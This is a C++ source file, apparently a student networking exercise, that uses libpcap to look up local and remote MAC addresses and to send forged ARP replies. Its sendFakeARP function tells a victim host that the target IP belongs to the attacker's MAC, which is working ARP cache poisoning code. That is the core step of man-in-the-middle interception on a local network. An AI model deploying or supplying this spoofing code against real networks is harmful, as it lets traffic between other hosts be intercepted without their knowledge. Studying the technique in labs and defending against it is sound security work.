#include <arpa/inet.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>
#include <stdlib.h>
#include <cstdio>
#include <pcap.h>
#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "sendarp.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac addressInfo::getMyMac(const char* ifname){
    struct ifreq ifr;
    int sockfd, ret;
    uint8_t macAddr[6];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        exit(0);
    }

    close(sockfd);
    
    memcpy(macAddr, ifr.ifr_hwaddr.sa_data, 6);
    return Mac(macAddr);
}

Ip addressInfo::getMyIp(const char* ifname){
    struct ifreq ifr;
    int sockfd, ret;
    char ipAddr[40];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        fprintf(stderr, "Fail to get interface IP address - socket() failed - %m\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0) {
        fprintf(stderr, "Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        exit(0);
    }

    close(sockfd);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipAddr, sizeof(struct sockaddr));

    return Ip(ipAddr);
}

Mac getMacFromIP(pcap_t* handle, addressInfo myAddressInfo, const char* ipAddr){
    
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    EthArpPacket arpPacket;
    EthArpPacket* arpReply;
 
    Ip targetIp(ipAddr);

    arpPacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    arpPacket.eth_.smac_ = myAddressInfo.myMac;
    arpPacket.eth_.type_ = htons(EthHdr::Arp);

    arpPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpPacket.arp_.hln_ = Mac::SIZE;
    arpPacket.arp_.pln_ = Ip::SIZE;
    arpPacket.arp_.op_ = htons(ArpHdr::Request);
    arpPacket.arp_.smac_ = myAddressInfo.myMac;
    arpPacket.arp_.sip_ = htonl(myAddressInfo.myIp); 
    arpPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpPacket.arp_.tip_ = htonl(targetIp);
    
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
    if (res != 0) {
       	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
                if (res != 0) {
       	            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            continue;
        }
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }

        arpReply = (EthArpPacket*)packet;
        if((arpReply->eth_.type_ == htons(EthHdr::Arp)) && (arpReply->arp_.op_ == htons(ArpHdr::Reply)) 
                && (arpReply->arp_.sip_.operator==(htonl(targetIp)))){
            return arpReply->arp_.smac_;
        }
    }
}

void sendFakeARP(pcap_t* handle, addressInfo myAddressInfo, const char* senderIp, const char* targetIp){

    Mac senderMac = myAddressInfo.arpCache.find(senderIp)->second;
    Mac targetMac = myAddressInfo.arpCache.find(targetIp)->second;

    printf("sender Ip: %s\n", senderIp);
    printf("sender Mac: %s\n",senderMac.operator std::string().c_str());
    puts("");

    printf("target Ip: %s\n", targetIp);
    printf("target Mac: %s\n",targetMac.operator std::string().c_str());
    puts("");

    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = myAddressInfo.myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myAddressInfo.myMac;
    packet.arp_.sip_ = htonl(Ip(targetIp));
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(Ip(senderIp));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
    	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
